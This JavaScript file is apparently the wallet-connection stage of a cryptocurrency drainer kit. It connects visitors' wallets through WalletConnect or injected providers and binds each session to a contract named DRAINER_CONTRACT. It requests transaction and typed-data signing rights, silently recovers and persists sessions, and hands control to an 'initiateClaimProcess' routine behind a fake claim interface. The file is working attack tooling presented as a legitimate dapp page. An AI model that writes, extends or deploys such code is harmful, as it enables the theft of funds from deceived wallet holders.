import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID,
    SUPPORTED_CHAINS,
  } = CONFIG;

  const ACTIVE_PROJECT_ID = PROJECT_ID; 

  const UA = navigator.userAgent;
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid = () => /Android/i.test(UA);
  const isDesktop = () => !isMobile();
  const getPlatform = () => (isIOS() ? 'ios' : isAndroid() ? 'android' : 'desktop');

  // ═══════════════════════════════════════════════════════════════════════
  //  3. DEBUG PANEL
  // ═══════════════════════════════════════════════════════════════════════
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position:fixed; bottom:0; left:0; width:100%;
    background:#000; color:#0f0; font-size:11px; padding:4px 6px;
    z-index:10000; max-height:120px; overflow-y:auto;
    display:none; font-family:monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log(`[main.js] ${msg}`);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}  ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ═══════════════════════════════════════════════════════════════════════
  //  4. STATE
  // ═══════════════════════════════════════════════════════════════════════
  const state = {
    SignClient: null,
    WalletConnectModal: null,
    EthereumProvider: null,
    client: null,
    modal: null,
    libsLoading: null,
    libsLoaded: false,
    isConnecting: false,
    currentSession: null,
    currentProvider: null,
    currentWeb3: null,
    currentContract: null,
    currentAddress: null,
    currentChain: null,
    modalOpenAt: 0,
    apexListenerInstalled: false,
  };

  // ═══════════════════════════════════════════════════════════════════════
  //  5. DOM
  // ═══════════════════════════════════════════════════════════════════════
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ═══════════════════════════════════════════════════════════════════════
  //  6. UI HELPERS
  // ═══════════════════════════════════════════════════════════════════════
  function setButtonState(button, stateName) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = stateName === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition   = 'all 0.25s ease';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.fontFamily   = "'Inter', sans-serif";
    button.style.boxShadow    = '0 4px 12px rgba(0,0,0,0.15)';
    button.style.minWidth     = '180px';
    button.disabled           = stateName === 'loading';

    switch (stateName) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting…';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 2500);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet';
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent     = message;
    claimStatus.className       = `status ${type}`;
    claimStatus.style.display   = 'block';
    claimStatus.style.padding   = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize  = '14px';
    claimStatus.style.textAlign = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ═══════════════════════════════════════════════════════════════════════
  //  7. PUBLISH GLOBAL (script.js reads this)
  // ═══════════════════════════════════════════════════════════════════════
  function publishGlobal({ address, chain, web3, contract, provider, session }) {
    state.currentAddress  = address;
    state.currentChain    = chain;
    state.currentWeb3     = web3;
    state.currentContract = contract;
    state.currentProvider = provider;
    state.currentSession  = session || null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3     || null,
      contract: contract || null,
      provider: provider || null,
      session:  session  || null,
      publishedAt: Date.now(),
    };

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain, provider, web3, contract, session },
    }));
    logDebug(`📡 published __apexConnected (${chain} ${address})`);
  }

  function clearGlobal() {
    delete window.__apexConnected;
    window.dispatchEvent(new CustomEvent('apex:disconnected'));
    logDebug('📡 cleared __apexConnected');
  }

  // ═══════════════════════════════════════════════════════════════════════
  //  8. UI: address pill
  // ═══════════════════════════════════════════════════════════════════════
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const label = chain === 'evm' ? '◆ ETH' : chain === 'solana' ? '◎ SOL' : '₿ BTC';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px; padding:10px 16px;
        font-family:'JetBrains Mono', monospace; font-size:14px;
        color:#059669; text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px; border:1px solid #A7F3D0;
        box-shadow:0 2px 8px rgba(5,150,105,0.1);
      `;
      (connectButton?.parentNode || document.body).appendChild(display);
    }
    const short = `${address.slice(0, 6)}…${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937; color:#fff; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const prev = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => (btn.innerHTML = prev), 1800);
      });
    });
    showStatus(`Connected · ${label}`, 'success');
  }

  function resetUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
  }

  // ═══════════════════════════════════════════════════════════════════════
  //  9. LIBRARY LOADING (single-flight, parallel)
  // ═══════════════════════════════════════════════════════════════════════
  async function loadFirstAvailable(urls) {
    let lastErr;
    for (const url of urls) {
      try {
        const mod = await import(url);
        return mod;
      } catch (e) {
        lastErr = e;
      }
    }
    throw lastErr || new Error('All CDN URLs failed');
  }

  async function loadLibraries() {
    if (state.libsLoaded) return;
    if (state.libsLoading) return state.libsLoading;

    state.libsLoading = (async () => {
      logDebug('📦 loading WalletConnect libs…');
      const t0 = performance.now();

      const [SignMod, ModalMod, ProvMod] = await Promise.all([
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/sign-client@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
        ]),
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/modal@2.6.2',
          'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
          'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
        ]),
        loadFirstAvailable([
          'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
          'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
        ]),
      ]);

      state.SignClient         = SignMod.default   || SignMod;
      state.WalletConnectModal = ModalMod.WalletConnectModal || ModalMod.default || ModalMod;
      state.EthereumProvider   = ProvMod.EthereumProvider   || ProvMod.default   || ProvMod;

      if (!state.SignClient || !state.WalletConnectModal || !state.EthereumProvider) {
        throw new Error('One or more WalletConnect modules failed to load');
      }
      state.libsLoaded = true;
      logDebug(`✅ libs loaded in ${Math.round(performance.now() - t0)} ms`);
    })();

    return state.libsLoading;
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 10. WALLETCONNECT INITIALIZATION (singleton)
  // ═══════════════════════════════════════════════════════════════════════
  async function ensureWalletConnect() {
    if (state.client && state.modal) return true;
    await loadLibraries();

    try {
      state.client = await state.SignClient.init({
        projectId: ACTIVE_PROJECT_ID,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      state.modal = new state.WalletConnectModal({
        projectId: ACTIVE_PROJECT_ID,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask',      links: { native: 'metamask://',        universal: 'https://metamask.app.link/' } },
          { id: 'trust',    name: 'Trust Wallet',  links: { native: 'trust://',           universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',  name: 'Rainbow',       links: { native: 'rainbow://',         universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase',      links: { native: 'coinbasewallet://',  universal: 'https://go.cb-w.com/' } },
        ],
      });

      // Register global event listeners once
      state.client.on('session_update', ({ params }) => {
        const acc = params.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (acc) logDebug(`session_update: ${acc}`);
      });
      state.client.on('session_delete', () => {
        logDebug('session_delete');
        resetUI();
        clearGlobal();
      });

      logDebug('✅ WalletConnect initialised');
      return true;
    } catch (e) {
      logDebug(`❌ WC init failed: ${e.message}`);
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 11. EIP-6963 PROVIDER DISCOVERY
  // ═══════════════════════════════════════════════════════════════════════
  const evmProviders = [];
  let eip6963Ready = false;
  function setupEIP6963() {
    if (eip6963Ready) return;
    eip6963Ready = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 400);
    setTimeout(request, 1000);
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 12. WEB3 IMPORT HELPER (cache)
  // ═══════════════════════════════════════════════════════════════════════
  async function importWeb3() {
    if (window.__Web3__) return window.__Web3__;
    const mod = await import('https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js');
    window.__Web3__ = mod.default || mod;
    return window.__Web3__;
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 13. BUILD WC PROVIDER FROM SESSION — the critical fix
  //     Includes rpcMap so the provider can actually relay eth_* calls.
  // ═══════════════════════════════════════════════════════════════════════
  async function buildProviderFromSession(session) {
    const accounts = session?.namespaces?.eip155?.accounts || [];
    if (!accounts.length) throw new Error('Session has no eip155 accounts');
    const address = accounts[0].split(':')[2];

    const sessionChains = (session.namespaces.eip155.chains || [])
      .map((c) => parseInt(c.split(':')[1], 10));
    if (!sessionChains.includes(MAINNET_ID)) {
      throw new Error(`Session does not cover chain ${MAINNET_ID}`);
    }

    const provider = await state.EthereumProvider.init({
      projectId: ACTIVE_PROJECT_ID,
      metadata: DAPP_METADATA,
      session,
      chains: [MAINNET_ID],
      optionalChains: SUPPORTED_CHAINS,
      rpcMap: {
        [MAINNET_ID]: 'https://eth.llamarpc.com',
      },
      showQrModal: false,
      methods: [
        'eth_sendTransaction',
        'personal_sign',
        'eth_signTypedData_v4',
        'eth_signTypedData',
      ],
      events: ['chainChanged', 'accountsChanged'],
    });

    // Verify the provider actually works
    let provAccounts = [];
    try {
      provAccounts = await provider.request({ method: 'eth_accounts' });
    } catch (e) {
      logDebug(`eth_accounts failed: ${e.message}`);
    }

    if (!provAccounts || provAccounts.length === 0) {
      logDebug('⚠️ provider returned no accounts — retrying in 1s');
      await new Promise((r) => setTimeout(r, 1000));
      provAccounts = await provider.request({ method: 'eth_accounts' });
      if (!provAccounts || provAccounts.length === 0) {
        throw new Error('Provider returned no accounts');
      }
    }

    return { provider, address };
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 14. DIRECT EVM (desktop preferred path)
  // ═══════════════════════════════════════════════════════════════════════
  async function tryDirectEVM(timeoutMs = 30_000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 250));

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected', icon: '', uuid: 'injected' },
        provider: window.ethereum,
      }];
    }
    if (!providers.length) {
      logDebug('Direct EVM: no providers');
      return false;
    }

    const preferred =
      providers.find((p) => p.info.rdns === 'io.metamask') ||
      providers.find((p) => p.info.name.toLowerCase().includes('metamask')) ||
      providers[0];

    logDebug(`Direct EVM: ${preferred.info.name} (timeout ${timeoutMs}ms)`);

    try {
      const accounts = await Promise.race([
        preferred.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('Direct EVM timeout')), timeoutMs)),
      ]);

      if (!accounts?.length) return false;
      const address = accounts[0];

      await importWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(preferred.provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      logDebug(`✅ Direct EVM: ${address}`);
      publishGlobal({
        address,
        chain: 'evm',
        web3,
        contract,
        provider: preferred.provider,
        session: null,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(preferred.provider);
      return true;
    } catch (e) {
      logDebug(`Direct EVM failed: ${e.message}`);
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 15. WALLETCONNECT CONNECT (mobile & desktop fallback)
  //     Mobile target: < 60 s from tap → QR visible.
  //     Preloaded libs make this ~1–3 s in practice.
  // ═══════════════════════════════════════════════════════════════════════
  async function tryWalletConnect(timeoutMs = 90_000) {
    if (state.isConnecting) {
      logDebug('WC: already connecting');
      return false;
    }
    state.isConnecting = true;

    try {
      const ok = await ensureWalletConnect();
      if (!ok) {
        state.isConnecting = false;
        return false;
      }

      try { state.modal.closeModal(); } catch (_) {}

      showStatus('Requesting wallet connection…', 'info');

      // ── Create pairing URI ──
      const { uri, approval } = await state.client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
              'eth_signTypedData',
            ],
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No pairing URI received');
      logDebug(`WC URI acquired (${uri.length} chars)`);

      // ── Open modal ──
      state.modalOpenAt = Date.now();
      state.modal.openModal({ uri });
      showStatus('Scan the QR or open your wallet', 'info');

      // ── Wait for session, with mobile recovery ──
      let session;
      try {
        session = await Promise.race([
          approval(),
          new Promise((_, rej) =>
            setTimeout(() => rej(new Error('WC approval timeout')), timeoutMs)
          ),
        ]);
      } catch (approvalErr) {
        if (isMobile()) {
          logDebug('Approval timed out — probing client.session for recovered session');
          await new Promise((r) => setTimeout(r, 1500));
          const sessions = state.client.session.values();
          if (sessions.length) {
            session = sessions[sessions.length - 1];
            logDebug('Recovered session from client');
          } else {
            throw approvalErr;
          }
        } else {
          throw approvalErr;
        }
      }

      // ── Close modal robustly ──
      for (let i = 0; i < 5; i++) {
        try { state.modal.closeModal(); } catch (_) {}
        await new Promise((r) => setTimeout(r, 150));
        if (!document.querySelector('wcm-modal')) break;
      }

      // ── Validate session ──
      const accounts = session?.namespaces?.eip155?.accounts || [];
      if (!accounts.length) throw new Error('Session has no accounts');

      // ── Build live provider ──
      const { provider, address } = await buildProviderFromSession(session);
      logDebug(`✅ WC session ready: ${address}`);

      await importWeb3();
      const Web3 = window.__Web3__;
      const web3 = new Web3(provider);
      const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      publishGlobal({
        address,
        chain: 'evm',
        web3,
        contract,
        provider,
        session,
      });
      updateConnectedUI(address, 'evm');
      attachEVMListeners(provider);
      persistSession({ address, chain: 'evm', topic: session.topic });

      state.isConnecting = false;
      return true;
    } catch (e) {
      logDebug(`❌ WC failed: ${e.message}`);
      try { state.modal?.closeModal(); } catch (_) {}
      if (/reject|cancel/i.test(e.message)) showStatus('Connection cancelled', 'error');
      else if (/timeout/i.test(e.message)) showStatus('Wallet timeout — try again', 'error');
      else showStatus(`Wallet connection failed: ${e.message}`, 'error');
      state.isConnecting = false;
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 16. EVM LISTENERS
  // ═══════════════════════════════════════════════════════════════════════
  function attachEVMListeners(provider) {
    if (!provider || provider.__apexListeners) return;
    provider.__apexListeners = true;

    provider.on?.('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        resetUI();
        clearGlobal();
        return;
      }
      const addr = accounts[0];
      logDebug(`accountsChanged → ${addr}`);
      publishGlobal({
        address: addr,
        chain: 'evm',
        web3: state.currentWeb3,
        contract: state.currentContract,
        provider,
        session: state.currentSession,
      });
      updateConnectedUI(addr, 'evm');
      persistSession({ address: addr, chain: 'evm', topic: state.currentSession?.topic });
    });

    provider.on?.('chainChanged', (chainId) => {
      logDebug(`chainChanged → ${chainId}`);
      showStatus(`Network changed to ${parseInt(chainId, 16)}`, 'info');
    });

    provider.on?.('disconnect', () => {
      logDebug('provider disconnect');
      resetUI();
      clearGlobal();
      forgetSession();
    });
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 17. MOBILE SCROLL — bring main button into view when tapping top nav
  // ═══════════════════════════════════════════════════════════════════════
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 250);
    });
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 18. DISCONNECT
  // ═══════════════════════════════════════════════════════════════════════
  async function disconnect() {
    try {
      if (state.client && state.currentSession) {
        await state.client.disconnect({
          topic: state.currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (state.currentProvider?.disconnect) {
        await state.currentProvider.disconnect();
      }
    } catch (e) {
      logDebug(`disconnect error: ${e.message}`);
    }
    resetUI();
    clearGlobal();
    forgetSession();
    state.currentSession  = null;
    state.currentProvider = null;
    state.currentWeb3     = null;
    state.currentContract = null;
    state.currentAddress  = null;
    state.currentChain    = null;
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 19. MAIN CONNECT DISPATCHER
  //     Mobile: WalletConnect only  (target < 60 s from tap → QR)
  //     Desktop: Direct EVM → WalletConnect (allowing 60 s+)
  // ═══════════════════════════════════════════════════════════════════════
  async function connect() {
    if (state.isConnecting) {
      logDebug('already connecting');
      return;
    }
    state.isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    const t0 = performance.now();

    try {
      if (isMobile()) {
        // ── Mobile path: WalletConnect only, preloaded libs → fast ──
        logDebug('📱 mobile → WalletConnect');
        const ok = await tryWalletConnect(90_000);
        if (!ok) {
          showStatus('Could not connect. Please try again.', 'error');
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
          return;
        }
        logDebug(`✅ mobile connected in ${Math.round(performance.now() - t0)} ms`);
      } else {
        // ── Desktop path: direct first, then WC fallback ──
        logDebug('🖥️ desktop → direct EVM first');
        const direct = await tryDirectEVM(30_000);
        if (!direct) {
          logDebug('Direct EVM failed → WalletConnect fallback');
          const ok = await tryWalletConnect(120_000);
          if (!ok) {
            showStatus('No wallet found. Install MetaMask or try WalletConnect.', 'error');
            setButtonState(connectButton, 'failed');
            if (walletButton) setButtonState(walletButton, 'failed');
            return;
          }
        }
        logDebug(`✅ desktop connected in ${Math.round(performance.now() - t0)} ms`);
      }

      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');

      // Hand control to script.js after a short settle delay
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          try { window.initiateClaimProcess(); } catch (e) { logDebug(`initiateClaimProcess error: ${e.message}`); }
        }
      }, 1200);
    } finally {
      state.isConnecting = false;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 20. CLICK HANDLER
  // ═══════════════════════════════════════════════════════════════════════
  const onClick = async () => {
    const saved = window.__apexConnected?.address || localStorage.getItem('apex.address');
    if (saved) {
      await disconnect();
    } else {
      await connect();
    }
  };
  if (connectButton) connectButton.addEventListener('click', onClick);
  if (walletButton)  walletButton.addEventListener('click',  onClick);

  // ═══════════════════════════════════════════════════════════════════════
  // 21. LOCAL PERSISTENCE
  // ═══════════════════════════════════════════════════════════════════════
  function persistSession({ address, chain, topic }) {
    try {
      localStorage.setItem('apex.address', address);
      localStorage.setItem('apex.chain', chain);
      if (topic) localStorage.setItem('apex.topic', topic);
      else localStorage.removeItem('apex.topic');
    } catch (_) {}
  }
  function forgetSession() {
    try {
      localStorage.removeItem('apex.address');
      localStorage.removeItem('apex.chain');
      localStorage.removeItem('apex.topic');
    } catch (_) {}
  }

  // Sync persistence on global publish
  window.addEventListener('apex:connected', (ev) => {
    const { address, chain, session } = ev.detail || {};
    if (address && chain) persistSession({ address, chain, topic: session?.topic });
  });
  window.addEventListener('apex:disconnected', () => forgetSession());

  // ═══════════════════════════════════════════════════════════════════════
  // 22. RESTORE SESSION ON PAGE LOAD
  // ═══════════════════════════════════════════════════════════════════════
  async function restoreSession() {
    const address = localStorage.getItem('apex.address');
    const chain   = localStorage.getItem('apex.chain') || 'evm';
    const topic   = localStorage.getItem('apex.topic');
    if (!address) return;

    logDebug(`♻️ restore ${chain} ${address}`);

    // WalletConnect session restore
    if (chain === 'evm' && topic) {
      try {
        const ok = await ensureWalletConnect();
        if (ok) {
          const session = state.client.session.get(topic);
          if (session) {
            const { provider, address: recovered } = await buildProviderFromSession(session);
            await importWeb3();
            const Web3 = window.__Web3__;
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            publishGlobal({
              address: recovered,
              chain: 'evm',
              web3,
              contract,
              provider,
              session,
            });
            updateConnectedUI(recovered, 'evm');
            attachEVMListeners(provider);
            return;
          }
          logDebug('saved session not found — clearing');
          localStorage.removeItem('apex.topic');
        }
      } catch (e) {
        logDebug(`WC restore failed: ${e.message}`);
      }
    }

    // Direct EVM restore (desktop only)
    if (chain === 'evm' && isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts[0] === address) {
          await importWeb3();
          const Web3 = window.__Web3__;
          const web3 = new Web3(window.ethereum);
          const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobal({
            address,
            chain: 'evm',
            web3,
            contract,
            provider: window.ethereum,
            session: null,
          });
          updateConnectedUI(address, 'evm');
          attachEVMListeners(window.ethereum);
          return;
        }
      } catch (e) {
        logDebug(`injected restore failed: ${e.message}`);
      }
    }

    // Stale — clear
    forgetSession();
  }

  // ═══════════════════════════════════════════════════════════════════════
  // 23. VISIBILITY RESUME — handle mobile WC return
  // ═══════════════════════════════════════════════════════════════════════
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!isMobile()) return;
    if (!state.client) return;
    if (window.__apexConnected?.address) return; // already connected

    logDebug('👁 visibility change — checking WC session return');

    setTimeout(async () => {
      try {
        const sessions = state.client.session.values();
        if (!sessions.length) return;
        const session = sessions[sessions.length - 1];
        const acc = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (!acc) return;

        logDebug(`🎯 session recovered from visibility: ${acc}`);

        const { provider, address } = await buildProviderFromSession(session);
        await importWeb3();
        const Web3 = window.__Web3__;
        const web3 = new Web3(provider);
        const contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

        publishGlobal({ address, chain: 'evm', web3, contract, provider, session });
        updateConnectedUI(address, 'evm');
        attachEVMListeners(provider);
        persistSession({ address, chain: 'evm', topic: session.topic });
        try { state.modal?.closeModal(); } catch (_) {}

        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            try { window.initiateClaimProcess(); } catch (e) { logDebug(`dispatch error: ${e.message}`); }
          }
        }, 1000);
      } catch (e) {
        logDebug(`visibility resume failed: ${e.message}`);
      }
    }, 800);
  });

  // ═══════════════════════════════════════════════════════════════════════
  // 24. BOOT
  // ═══════════════════════════════════════════════════════════════════════
  try {
    // Preload libraries in the background so the mobile modal is instant
    loadLibraries().catch((e) => logDebug(`preload libs failed: ${e.message}`));

    // Try to restore previous connection
    await restoreSession();
  } catch (e) {
    logDebug(`boot error: ${e.message}`);
  }

  logDebug(`✅ main.js ready · platform=${getPlatform()} mobile=${isMobile()} desktop=${isDesktop()}`);
})();
